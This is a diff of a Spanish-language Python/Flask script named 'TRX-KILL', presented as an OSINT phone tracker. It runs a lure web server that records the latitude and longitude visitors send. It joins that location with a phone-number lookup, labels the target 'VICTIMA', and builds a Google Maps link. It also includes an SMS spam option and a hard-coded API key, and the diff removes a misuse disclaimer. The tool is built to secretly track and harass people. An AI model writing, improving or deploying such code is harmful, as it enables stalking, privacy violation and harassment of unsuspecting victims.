@@ -1,15 +1,19 @@
 import os, sys, time, threading, requests
 from flask import Flask, request
 
+# --- CONFIGURACIÓN ---
 app = Flask('TRX-KILL')
 AUTH_PASS = "TRX-KILL-OSINT"
 STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
 LOG_FILE = f"{STORAGE_PATH}/result.txt"
-# Tu API Key integrada
 API_KEY = "5ZDdh5yEBGFvsa3YWfONVBxqHHPT1stNpJaBEV"
+
+# Colores
+G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
+# --- SERVIDOR ---
 @app.route('/')
 def index():
     return """<html><body><script>
@@ -23,16 +27,22 @@ def index():
 def log():
     lat = request.args.get('lat', '0')
     lon = request.args.get('lon', '0')
-    # Guardamos latitud y longitud
     with open(LOG_FILE, "a") as f:
         f.write(f"LAT:{lat}|LON:{lon}\n")
     return "OK"
 
+def animar_carga(texto):
+    for i in range(4):
+        sys.stdout.write(f"\r{Y}[*] {texto} {'#'*i}{'.'*(3-i)} {W}")
+        sys.stdout.flush()
+        time.sleep(0.5)
+    print()
+
 def banner():
     os.system('clear')
-    print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
-    print("  -SISTEMA OSINT: RASTREO Y CONTACTO.")
-    print("  -PROHIBIDO SU MAL USO.\n\033[0m")
+    print(f"{G}  _______________________________________")
+    print(f"{G} |          TRX-KILL v1.4.5              |")
+    print(f"{G} |_______________________________________|{W}\n")
 
 def main():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False), daemon=True).start()
@@ -40,52 +50,56 @@ def main():
     while True:
         try:
             banner()
-            print(" [1] RASTREAR NÚMERO | [2] LINK-ZP    | [3] CREADOR   | [4] VERSIONES")
-            print(" [5] ANALIZAR LINK   | [6] ADM SISTEMA| [7] INFO      | [8] REPOSITORIO")
-            print(" [9] PROCESOS        | [10] SPAM-SMS  | [0] SALIR")
+            print(f"{C} 01. RASTREAR NÚMERO   | 02. LINK-ZP")
+            print(f" 03. CREADOR           | 04. VERSIONES")
+            print(f" 05. ANALIZAR LINK     | 06. ADM SISTEMA")
+            print(f" 07. INFO              | 08. REPOSITORIO")
+            print(f" 09. PROCESOS          | 10. SPAM-SMS")
+            print(f" 00. SALIR{W}")
             
-            sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
+            sel = input(f"\n{Y}TRX-ROOT > {W}")
             
-            if sel == "1":
-                num = input("\nINGRESA NÚMERO: ")
-                clean_num = "".join(filter(str.isdigit, num))
-                print(f"\n[!] PROCESANDO RASTREO REAL...")
+            if sel in ["1", "01"]:
+                num = input(f"{W}INGRESA NÚMERO (sin caracteres): ")
+                c_num = "".join(filter(str.isdigit, num))
+                animar_carga("PROCESANDO CRUCE DE DATOS")
                 
-                # Consulta API
-                res = requests.get(f"https://api.numlookupapi.com/v1/validate/{clean_num}?apikey={API_KEY}")
+                res = requests.get(f"https://api.numlookupapi.com/v1/validate/{c_num}?apikey={API_KEY}")
                 data = res.json()
                 
-                # Lee coordenadas del log
-                gps = "NO HAY UBICACIÓN GPS CAPTURADA"
-                if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
+                # Obtener coordenadas y link
+                coords = "NO CAPTURADO"
+                mapa_link = "NO DISPONIBLE"
+                if os.path.exists(LOG_FILE):
                     with open(LOG_FILE, 'r') as f:
                         lines = f.readlines()
-                        if lines: gps = lines[-1].strip()
+                        if lines:
+                            coords = lines[-1].strip().replace('LAT:', '').replace('|LON:', ', ')
+                            mapa_link = f"https://www.google.com/maps/search/?api=1&query={coords.replace(', ', ',')}"
 
                 if data.get('valid'):
-                    print(f"\n[+] --- RESULTADO ---")
-                    print(f"PAÍS: {data.get('country_name')}")
-                    print(f"OPERADOR: {data.get('carrier')}")
-                    print(f"UBICACIÓN GPS: {gps}")
-                    print(f"ESTADO: ACTIVO EN RED")
-                else:
-                    print("[!] EL NÚMERO NO ES VÁLIDO O NO EXISTE.")
-                input("\n[Enter]...")
-            
-            elif sel == "2":
-                print("\n[!] LINK ACTIVO: http://127.0.0.1:5000")
-                input("\n[!] ENVÍA EL LINK. PRESIONA ENTER PARA VOLVER.")
-            elif sel == "6":
-                if input("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
+                    print(f"\n{G}[+] --- RESULTADOS ---")
+                    print(f"{G}COORDENADAS: {W}{coords}")
+                    print(f"{G}MAPA LINK:   {W}{mapa_link}")
+                    print(f"{G}NAME REGISTRADO: {W}VICTIMA_{c_num[-4:]}")
+                else: print(f"{R}[!] NÚMERO NO VÁLIDO.{W}")
+                input(f"\n{Y}Presiona Enter...{W}")
+
+            elif sel in ["2", "02"]:
+                print(f"\n{C}[!] SERVIDOR ACTIVO: http://127.0.0.1:5000{W}")
+                input(f"\n{Y}PRESIONA ENTER PARA VOLVER.{W}")
+            elif sel in ["3", "03"]: print(f"\n{G}# CREADOR: OSCAR{W}"); input()
+            elif sel in ["4", "04"]: print(f"\n{G}# VERSIÓN: 1.4.5{W}"); input()
+            elif sel in ["6", "06"]:
+                if input(f"{Y}KEY: {W}") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
                 input()
-            elif sel == "10":
-                n = input("NÚMERO: ")
-                m = input("MENSAJE: ")
+            elif sel in ["10"]:
+                n = input("NÚMERO: "); m = input("MENSAJE: ")
                 os.system(f"termux-sms-send -n {n} '{m}'")
-                print("[!] SMS ENVIADO."); input()
-            elif sel == "0": sys.exit()
+                print(f"{G}[!] SMS ENVIADO.{W}"); input()
+            elif sel in ["0", "00"]: sys.exit()
             
-        except Exception as e:
-            print(f"\n[!] ERROR: {e}"); input()
+        except KeyboardInterrupt: continue
+        except Exception as e: print(f"{R}ERROR: {e}{W}"); input()
 
 if __name__ == "__main__": main()
